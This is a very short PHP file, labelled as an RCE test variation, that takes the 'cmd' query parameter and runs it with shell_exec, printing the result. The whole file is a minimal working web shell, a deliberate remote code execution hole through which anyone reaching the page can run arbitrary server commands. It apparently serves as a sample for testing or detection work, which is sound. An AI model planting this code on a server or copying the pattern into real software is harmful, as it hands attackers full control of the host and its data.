<?php
// RCE test variation #1325
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>